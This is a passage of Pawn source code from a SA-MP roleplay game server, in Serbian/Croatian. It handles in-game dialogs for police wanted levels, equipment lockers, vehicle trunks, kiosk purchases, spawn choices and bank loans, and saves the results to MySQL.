		format( DialogStrgEx, sizeof( DialogStrgEx ), "{FFFFFF}Model: %s\nRegistracija: 'LS - %d'\nVlasnik: %s", ImeVozila[ VehicleInfo[ vehicleid ][ vModel ]-400 ], vehicleid, VehicleInfo[ vehicleid ][ vOwner ] );
		ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "U redu", "" );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
		return 1;
	}
	else if(dialogid == dialog_POSTAVIPOTERU && response && strlen( inputtext ) )
	{
		new lala[ MAX_PLAYER_NAME ], tekst[ 64 ];
		if( sscanf( inputtext, "s[24]s[64]", lala, tekst ) ) return SendErrorMessage( playerid, "Krivi unos." );
        if( GetPlayerIdFromName( lala ) == IPI ) return SendErrorMessage(playerid, "Pogresno ime gradjanina.");
		new id = GetPlayerIdFromName( lala );
		if( id == playerid ) return SendErrorMessage( playerid, "Ne mozete sebi dati wanted level!");
    	if( GetFactionType( id ) == ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Ne mozes dati wl policajcu.");
		PostaviWanted( id, tekst, ImeIgraca( playerid ) );
		return 1;
	}
	else if(dialogid == dialog_OCISTIDOSIJE && response && strlen( inputtext ) )
	{
		if( GetPlayerIdFromName( inputtext ) == IPI ) SendErrorMessage(playerid, "Pogresno ime gradjanina.");
		new ID = GetPlayerIdFromName( inputtext );
		if( GetFactionType( ID ) == ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Ne mozes ocistiti WL PD/SD clanu." );

		PlayerInfo[ ID ][ xWanted ] = 0;
	    SMG_SetPlayerWantedLevel( ID, PlayerInfo[ ID ][ xWanted ] );

	    strmid( ZlocinInfo[ ID ][zPrijavio], "Nema", 0, strlen("Nema"), 255);
		strmid( ZlocinInfo[ ID ][zPocinio], "Nema", 0, strlen("Nema"), 255);
		strmid( ZlocinInfo[ ID ][zZlocin], "Nema", 0, strlen("Nema"), 255);

	    SendInfoMessage(playerid, "Obrisali ste dosije gradjaninu {FFFFFF}%s.", ImeIgraca( ID ) );

		DodajWarnRed("~y~(CLEAR) %s ~w~je ocisti%s WL igracu ~y~%s.", ImeIgraca( playerid ), PlayerInfo[playerid][xPol] == 1 ? "o" : "la", ImeIgraca( ID ) );
 
		OrgPorukaLeader( PlayerInfo[ playerid ][ xClan ], 0xD2CFCFFF, "(CLEAR-WL): {FFFFFF}%s {D2CFCF}je ocistio WL igracu {FFFFFF}%s.", ImeIgraca( playerid ), ImeIgraca( ID ) );

		sql_user_update_integer( ID, "wanted_level", PlayerInfo[ ID ][ xWanted ] );
		return 1;
	}
	else if(dialogid == dialog_OPREMA )
	{
	    if( response )
		{
		    switch( listitem )
			{
				case 0:
				{
				    ResetPlayerWeapons( playerid );
				    GiveWeaponToPlayer( playerid, 3, 1 );
					GiveWeaponToPlayer( playerid, 41, 500 );
					GiveWeaponToPlayer( playerid, 24, 100 );
					SMG_SetPlayerSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );

					SendNearbyMessage(playerid, 25.0, 0xC2A2DAFF, "* %s je upravo uze%s patrolnu opremu.", ImeIgraca( playerid ), getPolForString(playerid,"o","la") );
				}
				case 1:
				{
					ResetPlayerWeapons( playerid );
					GiveWeaponToPlayer( playerid, 3, 1 );
					GiveWeaponToPlayer( playerid, 24, 100 );
					GiveWeaponToPlayer( playerid, 25, 100 );
					SMG_SetPlayerSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );

					SendNearbyMessage(playerid, 25.0, 0xC2A2DAFF, "* %s je upravo uze%s standardnu opremu.", ImeIgraca( playerid ), getPolForString(playerid,"o","la") );
				}
				case 2:
				{
				    if( PlayerInfo[ playerid ][ xRank ] >= 2 )
					{
						ResetPlayerWeapons( playerid );
						GiveWeaponToPlayer( playerid, 3, 1 );
						GiveWeaponToPlayer( playerid, 24, 100 );
						GiveWeaponToPlayer( playerid, 25, 100 );
						GiveWeaponToPlayer( playerid, 29, 500 );
						SMG_SetPlayerSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );

						SendNearbyMessage(playerid, 25.0, 0xC2A2DAFF, "* %s je upravo uze%s specijalnu opremu.", ImeIgraca( playerid ), getPolForString(playerid,"o","la") );
					}
					else return SendErrorMessage( playerid, "Nemate dovoljni rank(2+)." );
				}
				case 3:
				{
				    if( PlayerInfo[ playerid ][ xRank ] >= 1 )
					{
						ResetPlayerWeapons( playerid );
						GiveWeaponToPlayer( playerid, 24, 100 );
						GiveWeaponToPlayer( playerid, 29, 500 );
						GiveWeaponToPlayer( playerid, 31, 500 );
						SMG_SetPlayerSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );

						SendNearbyMessage(playerid, 25.0, 0xC2A2DAFF, "* %s je upravo uze%s profesionalnu opremu.", ImeIgraca( playerid ), getPolForString(playerid,"o","la") );
					}
					else return SendErrorMessage( playerid, "Nemate dovoljni rank(1+)." );
				}
				case 4:
				{
				    if( PlayerInfo[ playerid ][ xRank ] >= 3 )
					{
				    	ResetPlayerWeapons( playerid );
						GiveWeaponToPlayer( playerid, 24, 100 );
						GiveWeaponToPlayer( playerid, 34, 100 );
						SMG_SetPlayerSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );

						SendNearbyMessage(playerid, 25.0, 0xC2A2DAFF, "* %s je upravo uze%s snajpersku opremu.", ImeIgraca( playerid ), getPolForString(playerid,"o","la") );
					}
					else return SendErrorMessage( playerid, "Nemate dovoljni rank(3+)." );
				}
				case 5:
				{
					SetPlayerArmour( playerid, 100 );
					SendNearbyMessage(playerid, 25.0, 0xC2A2DAFF, "* %s je upravo uze%s nesto iz ormara.", ImeIgraca( playerid ), getPolForString(playerid,"o","la") );
				}
				case 6:
				{
					SetPlayerHealth( playerid, 100 );
					SendNearbyMessage(playerid, 25.0, 0xC2A2DAFF, "* %s je upravo uze%s nesto iz ormara.", ImeIgraca( playerid ), getPolForString(playerid,"o","la") );
				}
				case 7:
				{
				    if( PlayerInfo[ playerid ][ xRank ] >= 1 )
					{
						SMG_SetPlayerSkin( playerid, 285 );
						SetPlayerHealth( playerid, 100 );
						SetPlayerArmour( playerid, 150 );

						SendNearbyMessage(playerid, 25.0, 0xC2A2DAFF, "* %s je upravo obuka%s swat opremu.", ImeIgraca( playerid ), getPolForString(playerid,"o","la") );
                    }
					else return SendErrorMessage( playerid, "Nemate dovoljni rank(1+)." );
				}
				case 8:
				{
					BrojLisica[ playerid ] = 10;
				    SendNearbyMessage(playerid, 25.0, 0xC2A2DAFF, "* %s je upravo uze%s lisice iz ormara.", ImeIgraca( playerid ), getPolForString(playerid,"o","la") );
					SendInfoMessage( playerid, "Uzeli ste 10 para lisica iz ormara.");
				}
				case 9:
				{
					TazerMetkovi[ playerid ] = 100;
				    SendNearbyMessage(playerid, 25.0, 0xC2A2DAFF, "* %s je upravo uze%s nesto iz ormara.", ImeIgraca( playerid ), getPolForString(playerid,"o","la") );
					SendInfoMessage( playerid, "Uzeli ste 100 metkova tazera iz ormara.");
				}
			}
		}
	}
	else if(dialogid == dialog_VEHICLEWEPTAKE )
	{
	    new wepname[ 32 ];
	    if( response == 1 )
		{
	        switch( listitem )
			{
	            case 0:
				{
	                if( VehicleInfo[ TrunkVehicle[ playerid ] ][ vWeap1 ] == 0 ) return SendErrorMessage( playerid, "Nemate oruzja u tom slotu.");

	                format( wepname, sizeof( wepname ), "%s", WeapNames[ VehicleInfo[ TrunkVehicle[ playerid ] ][ vWeap1 ] ] );
	                GiveWeaponToPlayer( playerid, VehicleInfo[ TrunkVehicle[ playerid ] ][ vWeap1 ], VehicleInfo[ TrunkVehicle[ playerid ] ][ vAmmo1 ] );
	                VehicleInfo[ TrunkVehicle[ playerid ] ][ vWeap1 ] = 0;
	                VehicleInfo[ TrunkVehicle[ playerid ] ][ vAmmo1 ] = 0;

	                new q[ 128 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_weapon_slot_1` = '%d', `v_weapon_ammo_1` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
												VehicleInfo[ TrunkVehicle[ playerid ] ][ vWeap1 ],
												VehicleInfo[ TrunkVehicle[ playerid ] ][ vAmmo1 ],
												VehicleInfo[ TrunkVehicle[ playerid ] ][ vSqlID ] );

					mysql_tquery( mSQL, q );

					SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s vadi %s iz prtljaznika.", ImeIgraca( playerid ), wepname );
	            }
	            case 1:
				{
           	 		if( VehicleInfo[TrunkVehicle[ playerid ] ][ vWeap2 ] == 0) return SendErrorMessage( playerid, "Nemate oruzja u tom slotu.");

	                format( wepname, sizeof( wepname ), "%s", WeapNames[ VehicleInfo[ TrunkVehicle[ playerid ] ][ vWeap2 ] ] );
	                GiveWeaponToPlayer( playerid, VehicleInfo[ TrunkVehicle[ playerid ] ][ vWeap2 ], VehicleInfo[ TrunkVehicle[ playerid ] ][ vAmmo2 ] );
	                VehicleInfo[ TrunkVehicle[ playerid ] ][ vWeap2 ] = 0;
	                VehicleInfo[ TrunkVehicle[ playerid ] ][ vAmmo2 ] = 0;

	                new q[ 128 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_weapon_slot_2` = '%d', `v_weapon_ammo_2` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
												VehicleInfo[ TrunkVehicle[ playerid ] ][ vWeap2 ],
												VehicleInfo[ TrunkVehicle[ playerid ] ][ vAmmo2 ],
												VehicleInfo[ TrunkVehicle[ playerid ] ][ vSqlID ] );

					mysql_tquery( mSQL, q );

					SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s vadi %s iz prtljaznika.", ImeIgraca( playerid ), wepname );
	            }
	            case 2:
				{
           	 		if( VehicleInfo[TrunkVehicle[ playerid ]][vMelee] == 0) return SendErrorMessage( playerid, "Nemate oruzja u tom slotu.");

	                format( wepname, sizeof( wepname ), "%s", WeapNames[ VehicleInfo[ TrunkVehicle[ playerid ] ][ vMelee ] ] );
	                GiveWeaponToPlayer(playerid, VehicleInfo[ TrunkVehicle[ playerid ] ][ vMelee ], 1 );
	                VehicleInfo[ TrunkVehicle[ playerid ] ][ vMelee ] = 0;

	                new q[ 128 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_weapon_melee` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
												VehicleInfo[ TrunkVehicle[ playerid ] ][ vMelee ],
												VehicleInfo[ TrunkVehicle[ playerid ] ][ vSqlID ] );

					mysql_tquery( mSQL, q );

	               	SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s vadi %s iz prtljaznika.", ImeIgraca( playerid ), wepname );
				}
	        }
		}
	}
	else if(dialogid == dialog_MUNIFORM)
    {
        if(response == 1)
        {
            switch( listitem )
            {
                case 0:
                {
                    PlayerPlaySound( playerid, 1057, 0.0, 0.0, 0.0);
		           	SendInfoMessage( playerid, "Obukli ste svoju radnu uniformu i spremni za posao.");
		            SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s oblaci svoju radnu uniformu i priprema se za posao.", ImeIgraca( playerid ) );
		   			SMG_SetPlayerSkin( playerid, 70 );
				}
                case 1:
                {
			        PlayerPlaySound( playerid, 1057, 0.0, 0.0, 0.0);
		           	SendInfoMessage( playerid, "Obukli ste svoju radnu uniformu i spremni za posao.");
		            SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s oblaci svoju radnu uniformu i priprema se za posao.", ImeIgraca( playerid ) );
		   			SMG_SetPlayerSkin( playerid, 274 );
                }
                case 2:
                {
                    PlayerPlaySound( playerid, 1057, 0.0, 0.0, 0.0);
		           	SendInfoMessage( playerid, "Obukli ste svoju radnu uniformu i spremni za posao.");
		            SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s oblaci svoju radnu uniformu i priprema se za posao.", ImeIgraca( playerid ) );
		   			SMG_SetPlayerSkin( playerid, 275 );
				}
				case 3:
                {
                    PlayerPlaySound( playerid, 1057, 0.0, 0.0, 0.0);
		           	SendInfoMessage( playerid, "Obukli ste svoju radnu uniformu i spremni za posao.");
		            SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s oblaci svoju radnu uniformu i priprema se za posao.", ImeIgraca( playerid ) );
		   			SMG_SetPlayerSkin( playerid, 276 );
				}
            }
		}
    }
	else if(dialogid == dialog_KIOSK )
	{
	    if(response)
		{
            switch( listitem )
			{
                case 0:
				{
                    if( PlayerInfo[ playerid ][ xBrojTelefona ] == 0) return SendErrorMessage( playerid, "Nemate mobilni telefon.");
				   	if( PlayerInfo[ playerid ][ xNovac ] < 20 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 20$!");
					PlayerInfo[ playerid ][ xTelefonBon ] += 20;
					DajIgracuNovac( playerid, -20 );
					SendClientMessage( playerid, ZUTA, "(KIOSK): Kupili ste 20 kredita za $20.");
					sql_user_update_integer( playerid, "phone_credit", PlayerInfo[ playerid ][ xTelefonBon ] );
					BussinesTrafikaMoney(playerid, 20 );
                }
                case 1:
				{
                    if( PlayerInfo[ playerid ][ xBrojTelefona ] == 0) return SendErrorMessage( playerid, "Nemate mobilni telefon.");
				   	if( PlayerInfo[ playerid ][ xNovac ] < 50 ) return SendErrorMessage( playerid, " Nemate dovoljno novca 50$!");
					PlayerInfo[ playerid ][ xTelefonBon ] += 50;
					DajIgracuNovac( playerid, -50 );
					SendClientMessage( playerid, ZUTA, "(KIOSK): Kupili ste 50 kredita za $50.");
					sql_user_update_integer( playerid, "phone_credit", PlayerInfo[ playerid ][ xTelefonBon ] );
					BussinesTrafikaMoney(playerid, 50 );
                }
                case 2:
				{
                    if( PlayerInfo[ playerid ][ xBrojTelefona ] == 0) return SendErrorMessage( playerid, "Nemate mobilni telefon.");
				   	if( PlayerInfo[ playerid ][ xNovac ] < 100 ) return SendErrorMessage( playerid, " Nemate dovoljno novca 100$!");
					PlayerInfo[ playerid ][ xTelefonBon ] += 100;
					DajIgracuNovac( playerid, -100 );
					SendClientMessage( playerid, ZUTA, "(KIOSK): Kupili ste 100 kredita za $100.");
					sql_user_update_integer( playerid, "phone_credit", PlayerInfo[ playerid ][ xTelefonBon ] );
					BussinesTrafikaMoney(playerid, 100 );
                }
                case 3:
				{
                    if( PlayerInfo[ playerid ][ xBrojTelefona ] == 0) return SendErrorMessage( playerid, "Nemate mobilni telefon.");
				   	if( PlayerInfo[ playerid ][ xNovac ] < 500 ) return SendErrorMessage( playerid, " Nemate dovoljno novca 500$!");
					PlayerInfo[ playerid ][ xTelefonBon ] += 500;
					DajIgracuNovac( playerid, -500 );
					SendClientMessage( playerid, ZUTA, "(KIOSK): Kupili ste 500 kredita za $500.");
					sql_user_update_integer( playerid, "phone_credit", PlayerInfo[ playerid ][ xTelefonBon ] );
					BussinesTrafikaMoney(playerid, 500 );
                }
                case 4:
				{
				   	if( PlayerInfo[ playerid ][ xNovac ] < 15 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 15$!");
					DajIgracuNovac( playerid, -15 );
					SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_SPRUNK );
					SendClientMessage( playerid, ZUTA, "(KIOSK): Kupili ste sprite za $15.");
					BussinesTrafikaMoney(playerid, 15 );
				}
				case 5:
				{
				    if( PlayerInfo[ playerid ][ xNovac ] < 35 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 35$!");
				    new Float:Health;
					GetPlayerHealth( playerid, Health );
	                if( Health >= 100 ) return SendErrorMessage( playerid, "Vec imas 100HP.");

					SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s jede cokoladicu.", ImeIgraca( playerid ) );
				    OnePlayAnim( playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0 );
				    DodajIgracuHP( playerid, 20 );
				    DajIgracuNovac( playerid, -35 );
					BussinesTrafikaMoney(playerid, 35 );
				}
				case 6:
				{
				   	if( PlayerInfo[ playerid ][ xNovac ] < 85 ) return SendErrorMessage(playerid, "Nemate dovoljno novca 85$!");
					DajIgracuNovac( playerid, -85 );
					SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_BEER);
					SendClientMessage( playerid, ZUTA, "(KIOSK): Kupili ste pivo za $85.");
					BussinesTrafikaMoney(playerid, 85 );
				}
				case 7:
				{
				   	if( PlayerInfo[ playerid ][ xNovac ] < 52 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 52$!");
					DajIgracuNovac( playerid, -52 );
					SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_SPRUNK );
					SendClientMessage( playerid, ZUTA, "(KIOSK): Kupili ste coca colu za $52." );
					BussinesTrafikaMoney(playerid, 52 );
				}
				case 8:
				{
				   	if( PlayerInfo[ playerid ][ xNovac ] < 35 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 35$!");
					PlayerInfo[ playerid ][ xCigare ] += 20;
					DajIgracuNovac( playerid, -35 );
					SendClientMessage( playerid, ZUTA, "(KIOSK): Kupili ste kutiju cigareta koja sadrzi 20 cigare za $35.");
					SendClientMessage( playerid, ZUTA, "(KIOSK): Da pusis cigare kucaj {FFFFFF}[ /uzmicigaretu ].");
					BussinesTrafikaMoney(playerid, 35 );
				}
				case 9:
				{
				    if( PlayerInfo[ playerid ][ xUpaljac ] == 1 ) return SendErrorMessage( playerid, "Vec posedujes upaljac!");
				   	if( PlayerInfo[ playerid ][ xNovac] < 15 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 15$!");
					PlayerInfo[ playerid ][ xUpaljac ] = 1;
					DajIgracuNovac( playerid, -15 );
					SendClientMessage( playerid, ZUTA, "(KIOSK): Kupili ste upaljac za $15.");
					SendClientMessage( playerid, ZUTA, "(KIOSK): Da pusis cigare kucaj {FFFFFF}[ /uzmicigaretu ].");
					BussinesTrafikaMoney(playerid, 15 );
				}
			}
		}
	}
	else if(dialogid == dialog_SPAWNCHANGE )
	{
		if( response )
		{
		    switch( listitem )
			{
			    case 0:
				{
					if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_OBICAN_LS_1 ) return SendErrorMessage(playerid, "Spawn ti je vec postavljen na uobicajni u LSu!");
					PlayerInfo[ playerid ][ xSpawn ] = SPAWN_OBICAN_LS_1;
					sql_user_update_integer( playerid, "spawn", PlayerInfo[ playerid ][ xSpawn ] );
					SendClientMessage(playerid, ZUTA, "(SPAWN): Postavili ste spawn na uobicajni u LSu." );
			    }
                case 1:
				{
					if( PlayerInfo[ playerid ][ xClan ] < 1) return SendErrorMessage( playerid, "Nisi clan nijedne organizacije.");
					PlayerInfo[ playerid ][ xSpawn ] = SPAWN_BAZA;
					sql_user_update_integer( playerid, "spawn", PlayerInfo[ playerid ][ xSpawn ] );
					SendClientMessage( playerid, ZUTA, "(SPAWN): Od sada cete se spawnati u bazi orge." );
				}
			    case 2:
				{
					if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_IMOVINA_1 ) return SendErrorMessage( playerid, "Spawn ti je vec postavljen na imovinu 1!");
					if( PlayerInfo[ playerid ][ xProperty ][ 0 ] == -1 ) return SendErrorMessage( playerid, "Nemas imovinu 1!");
					PlayerInfo[ playerid ][ xSpawn ] = SPAWN_IMOVINA_1;
					sql_user_update_integer( playerid, "spawn", PlayerInfo[ playerid ][ xSpawn ] );
					SendClientMessage(playerid, ZUTA, "(SPAWN): Od sada cete se spawnati u imovini 1." );
			    }
			    case 3:
				{
					if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_IMOVINA_2 ) return SendErrorMessage( playerid, "Spawn ti je vec postavljen na imovinu 2!");
					if( PlayerInfo[ playerid ][ xProperty ][ 1 ] == -1 ) return SendErrorMessage( playerid, "Nemas imovinu 2!");
					PlayerInfo[ playerid ][ xSpawn ] = SPAWN_IMOVINA_2;
					sql_user_update_integer( playerid, "spawn", PlayerInfo[ playerid ][ xSpawn ] );
					SendClientMessage(playerid, ZUTA, "(SPAWN): Od sada cete se spawnati u imovini 2.");
			    }
			    case 4:
				{
					if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_IMOVINA_3 ) return SendErrorMessage( playerid, "Spawn ti je vec postavljen na imovinu 3!");
					if( PlayerInfo[ playerid ][ xProperty ][ 2 ] == -1 ) return SendErrorMessage( playerid, "Nemas imovinu 3!");
					PlayerInfo[ playerid ][ xSpawn ] = SPAWN_IMOVINA_3;
					sql_user_update_integer( playerid, "spawn", PlayerInfo[ playerid ][ xSpawn ] );
					SendClientMessage( playerid, ZUTA, "(SPAWN): Od sada cete se spawnati u imovini 3.");
			    }
			    case 5:
				{
					if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_RENT ) return SendErrorMessage( playerid, "Spawn ti je vec postavljen na iznajmljenu sobu!");
					if( PlayerInfo[ playerid ][ xRentID ] == -1 ) return SendErrorMessage( playerid, "Ne mozete staviti spawn na iznajmljenu sobu jer je niste iznajmili.");
					PlayerInfo[ playerid ][ xSpawn ] = SPAWN_RENT;
					sql_user_update_integer( playerid, "spawn", PlayerInfo[ playerid ][ xSpawn ] );
					SendClientMessage( playerid, ZUTA, "(SPAWN): Od sada cete se spawnati u iznajmljenoj sobi.");
			    }
			    case 6:
				{
			        if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_ADMIN ) return SendErrorMessage( playerid, "Spawn ti je vec postavljen na Admin bazu!");
			        if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 || PlayerInfo[playerid][xGamemaster] >= 1 )
					{
			        	PlayerInfo[ playerid ][ xSpawn ] = SPAWN_ADMIN;
						sql_user_update_integer( playerid, "spawn", PlayerInfo[ playerid ][ xSpawn ] );
						SendClientMessage( playerid, ZUTA, "(SPAWN): Od sada cete se spawnati u Admin bazi.");
			        }
			        else SendErrorMessage( playerid, "Samo Admini." );
			    }
		    }
		}
	}
	else if(dialogid == dialog_KREDIT )
	{
		if( !response ) return 1;
		if( response )
		{
			if( PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] > 0) return SendErrorMessage( playerid, "Vec imate podignut kredit!");
			switch( listitem )
			{
				case 0:
				{
					if( PlayerInfo[ playerid ][ xLevel] < 5 ) return SendErrorMessage( playerid, "Morate biti level 5+ za ovaj kredit!");
					PlayerInfo[ playerid ][ xIznosKredita ] = 20000;
					PlayerInfo[ playerid ][ xIznosRate ] = 1000;
					PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] = PlayerInfo[ playerid ][ xIznosKredita ];
					PlayerInfo[ playerid ][ xBRacun ] += PlayerInfo[ playerid ][ xIznosKredita ];
					SendClientMessage( playerid, ZUTA, "(BANKA): Podigli ste kredit u iznosu od $20000. [ /kredit ]");
                    UpdateBankTD( playerid );

					new q[ 180 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `xBRacun` = '%d', `credit_rest` = '%d', `credit_amount` = '%d', `credit_installment` = '%d' WHERE `user_id` = '%d'",
                        PlayerInfo[ playerid ][ xBRacun ],
						PlayerInfo[ playerid ][ xPreostaloZaOtplatu ],
						PlayerInfo[ playerid ][ xIznosKredita ],
						PlayerInfo[ playerid ][ xIznosRate ],
						PlayerInfo[ playerid ][ xID ] );
	   				mysql_tquery( mSQL, q );

					WriteLog("log-kredit", "%s podigao kredit: 20000$", ImeIgraca( playerid ));
				}
				case 1:
				{
					if( PlayerInfo[ playerid ][ xLevel ] < 10 ) return SendErrorMessage( playerid, "Morate biti level 10+ za ovaj kredit!");
					PlayerInfo[ playerid ][ xIznosKredita ] = 50000;
					PlayerInfo[ playerid ][ xIznosRate ] = 2000;
					PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] = PlayerInfo[ playerid ][ xIznosKredita];
					PlayerInfo[ playerid ][ xBRacun ] += PlayerInfo[ playerid ][ xIznosKredita];
					SendClientMessage( playerid, ZUTA, "(BANKA): Podigli ste kredit u iznosu od $50000. [ /kredit ]");
	                UpdateBankTD( playerid );

					new q[ 180 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `xBRacun` = '%d', `credit_rest` = '%d', `credit_amount` = '%d', `credit_installment` = '%d' WHERE `user_id` = '%d'",
                        PlayerInfo[ playerid ][ xBRacun ],
						PlayerInfo[ playerid ][ xPreostaloZaOtplatu ],
						PlayerInfo[ playerid ][ xIznosKredita ],
						PlayerInfo[ playerid ][ xIznosRate ],
						PlayerInfo[ playerid ][ xID ] );
	   				mysql_tquery( mSQL, q );

					WriteLog("log-kredit", "%s podigao kredit: 50000$", ImeIgraca( playerid ));
				}
				case 2:
				{
					if( PlayerInfo[ playerid ][ xLevel] < 15 ) return SendErrorMessage( playerid, "Morate biti level 15+ za ovaj kredit!");
				    PlayerInfo[ playerid ][ xIznosKredita ] = 80000;
					PlayerInfo[ playerid ][ xIznosRate ] = 3000;
					PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] = PlayerInfo[ playerid ][ xIznosKredita ];
					PlayerInfo[ playerid ][ xBRacun ] += PlayerInfo[ playerid ][ xIznosKredita ];
					SendClientMessage( playerid, ZUTA, "(BANKA): Podigli ste kredit u iznosu od $80000. [ /kredit ]");
                    UpdateBankTD( playerid );

					new q[ 180 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `xBRacun` = '%d', `credit_rest` = '%d', `credit_amount` = '%d', `credit_installment` = '%d' WHERE `user_id` = '%d'",
                        PlayerInfo[ playerid ][ xBRacun ],
						PlayerInfo[ playerid ][ xPreostaloZaOtplatu ],
						PlayerInfo[ playerid ][ xIznosKredita ],
						PlayerInfo[ playerid ][ xIznosRate ],
						PlayerInfo[ playerid ][ xID ] );
	   				mysql_tquery( mSQL, q );

					WriteLog("log-kredit", "%s podigao kredit: 80000$", ImeIgraca( playerid ));
				}
				case 3:
				{
					if( PlayerInfo[ playerid ][ xLevel ] < 20 ) return SendErrorMessage( playerid, "Morate biti level 20+ za ovaj kredit!");
					PlayerInfo[ playerid ][ xIznosKredita ] = 100000;
					PlayerInfo[ playerid ][ xIznosRate ] = 4000;
					PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] = PlayerInfo[ playerid ][ xIznosKredita ];
					PlayerInfo[ playerid ][ xBRacun ] += PlayerInfo[ playerid ][ xIznosKredita ];
					SendClientMessage( playerid, ZUTA, "(BANKA): Podigli ste kredit u iznosu od $100000. [ /kredit ]");
				    UpdateBankTD( playerid );

					new q[ 180 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `xBRacun` = '%d', `credit_rest` = '%d', `credit_amount` = '%d', `credit_installment` = '%d' WHERE `user_id` = '%d'",
                        PlayerInfo[ playerid ][ xBRacun ],
						PlayerInfo[ playerid ][ xPreostaloZaOtplatu ],
						PlayerInfo[ playerid ][ xIznosKredita ],
						PlayerInfo[ playerid ][ xIznosRate ],
						PlayerInfo[ playerid ][ xID ] );
	   				mysql_tquery( mSQL, q );

					WriteLog("log-kredit", "%s podigao kredit: 100000$", ImeIgraca( playerid ));
				}
			}
		}
	}
	else if(dialogid == dialog_INFOKREDIT && response )
	{
		if( !response ) return 1;
	    switch( listitem )
		{
			case 0:
			{
				format( globalstring, sizeof( globalstring ), "{FFFFFF}- Iznos Kredita: $%d\n- Iznos Rate Kredita: $%d\n- Preostalo za otplatu: $%d", PlayerInfo[ playerid ][ xIznosKredita ], PlayerInfo[ playerid ][ xIznosRate ], PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] );
				ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, globalstring, "Potvrdi", "Odustani" );
			}
			case 1: ShowPlayerDialog( playerid, dialog_PROMENARATEKREDITA, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Upisite novi iznos rate koje cete otplacivati...", "Potvrdi", "Odustani" );
			case 2:
			{
			    if( PlayerInfo[ playerid ][ xBRacun ] >= PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] )
				{
			        SendInfoMessage( playerid, "Uspesno ste otplatili ostatak kredita u iznosu od {FFFFFF}($%d).", PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] );
			        PlayerInfo[ playerid ][ xBRacun ] -= PlayerInfo[ playerid ][ xPreostaloZaOtplatu ];
			        PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] = 0;
			        PlayerInfo[ playerid ][ xIznosKredita ] = 0;
					PlayerInfo[ playerid ][ xIznosRate ] = 0;
				    UpdateBankTD( playerid );

					new q[ 256 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `xBRacun` = '%d', `credit_rest` = '%d', `credit_amount` = '%d', `credit_installment` = '%d' WHERE `user_id` = '%d'",
                        PlayerInfo[ playerid ][ xBRacun ],
						PlayerInfo[ playerid ][ xPreostaloZaOtplatu ],
						PlayerInfo[ playerid ][ xIznosKredita ],
						PlayerInfo[ playerid ][ xIznosRate ],
						PlayerInfo[ playerid ][ xID ] );
	   				mysql_tquery( mSQL, q );
			    }
			    else if( PlayerInfo[ playerid ][ xNovac ] > PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] )
				{
			        SendInfoMessage( playerid, "Uspesno ste otplatili ostatak kredita u iznosu od {FFFFFF}($%d).", PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] );
			        DajIgracuNovac( playerid, -PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] );
			        PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] = 0;
			        PlayerInfo[ playerid ][ xIznosKredita ] = 0;
					PlayerInfo[ playerid ][ xIznosRate ] = 0;

					new q[ 256 ];
